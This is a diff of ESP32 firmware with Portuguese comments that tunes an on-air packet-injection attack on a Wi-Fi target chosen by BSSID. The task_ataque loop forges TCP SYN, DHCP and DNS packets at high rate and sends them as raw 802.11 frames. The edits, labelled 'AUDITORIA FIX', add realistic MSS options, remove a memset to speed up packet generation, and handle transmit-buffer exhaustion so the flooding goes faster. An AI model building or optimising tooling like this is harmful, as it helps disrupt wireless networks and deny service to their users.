@@ -333,7 +333,10 @@ void task_monitoramento(void *pvParameters) {
                 scanner_pausa_ataque.store(true); vTaskDelay(pdMS_TO_TICKS(250));   
                 
                 uint8_t mac_alvo[6]; memcpy(mac_alvo, alvos_encontrados[alvo_selecionado].bssid, 6);
-                esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
+                
+                // [AUDITORIA FIX 4]: Remoção do esp_wifi_set_channel(1, ...) manual 
+                // para evitar latência no PLL e acelerar o Channel Pursuit
+                
                 wifi_scan_config_t scan_config = { .ssid = 0, .bssid = mac_alvo, .channel = 0, .show_hidden = true };
                 
                 if (esp_wifi_scan_start(&scan_config, true) == ESP_OK) {
@@ -444,7 +447,8 @@ void task_ataque(void *pvParameters) {
                 for (int i = 0; i < 15; i++) { 
                     if (scanner_pausa_ataque.load()) break;
 
-                    memset(pkt->l4_and_payload, 0, sizeof(pkt->l4_and_payload));
+                    // [AUDITORIA FIX 2]: Remoção do "memset" massivo na IRAM para economizar 4.320 ciclos/loop.
+                    
                     int tipo_ataque = fast_rand() % 10;
                     bool is_tcp = (tipo_ataque < chance_tcp_syn); 
                     bool is_dhcp = (tipo_ataque >= chance_tcp_syn && tipo_ataque < (chance_tcp_syn + chance_dhcp));
@@ -481,15 +485,25 @@ void task_ataque(void *pvParameters) {
                         
                         tcp->dest_port = htons(porta_alvo); 
                         tcp->seq_num = fast_rand(); tcp->ack_num = 0;
-                        tcp->data_offset_res = (5 << 4); tcp->flags = 0x02; 
+                        
+                        // [AUDITORIA FIX 5]: Adicionando 4 Bytes de Option MSS no pacote TCP SYN
+                        tcp->data_offset_res = (6 << 4); // Alterado de 5 para 6 (Header de 24 bytes)
+                        tcp->flags = 0x02; 
                         tcp->window_size = htons(5840); tcp->urgent_ptr = 0;
+                        
+                        uint8_t* tcp_options = pkt->l4_and_payload + sizeof(TcpHeader);
+                        tcp_options[0] = 0x02; // Option Kind: MSS
+                        tcp_options[1] = 0x04; // Option Length: 4
+                        tcp_options[2] = 0x05; // Option Value: 1460 (0x05B4)
+                        tcp_options[3] = 0xB4;
+                        t_payload = 4; // Contabiliza os 4 bytes do Option MSS como payload para o checksum
                         
                         t_injecao = sizeof(MacHeader) + sizeof(LlcSnapHeader) + sizeof(IpHeader) + sizeof(TcpHeader) + t_payload;
                         pkt->ip.total_length = htons(sizeof(IpHeader) + sizeof(TcpHeader) + t_payload);
                         
                         memcpy(pkt->mac.mac_dest, mac_alvo, 6); memcpy(pkt->mac.mac_bssid, mac_alvo, 6);
                         pkt->ip.checksum = 0; pkt->ip.checksum = fast_ip_checksum(&pkt->ip); 
-                        tcp->checksum = 0; tcp->checksum = fast_l4_checksum(&pkt->ip, tcp, sizeof(TcpHeader), nullptr, t_payload);
+                        tcp->checksum = 0; tcp->checksum = fast_l4_checksum(&pkt->ip, tcp, sizeof(TcpHeader), tcp_options, t_payload);
                     } 
                     else if (is_dhcp) {
                         UdpHeader* udp = (UdpHeader*)pkt->l4_and_payload;
@@ -557,11 +571,16 @@ void task_ataque(void *pvParameters) {
                         udp->checksum = (calc_chk_dns == 0x0000) ? 0xFFFF : calc_chk_dns;
                     }
                     
-                    if (esp_wifi_80211_tx(WIFI_IF_STA, pkt, t_injecao, false) == ESP_ERR_NO_MEM) break; 
+                    // [AUDITORIA FIX 1]: Micro-Yield forçado em caso de erro ESP_ERR_NO_MEM do Wi-Fi para quebrar Spinlock
+                    if (esp_wifi_80211_tx(WIFI_IF_STA, pkt, t_injecao, false) == ESP_ERR_NO_MEM) {
+                        vTaskDelay(pdMS_TO_TICKS(1)); 
+                        break; 
+                    }
                     else pacotes_enviados_segundo++;
                 }
             }
             
+            // [AUDITORIA FIX 3]: O cálculo da iteracao_yield permanece e agora é 100% fluido graças ao Fix 1
             iteracao_yield++; if (iteracao_yield % 20 == 0) vTaskDelay(pdMS_TO_TICKS(1)); 
         } else {
             config_radio_aplicada = false; vTaskDelay(pdMS_TO_TICKS(100)); 
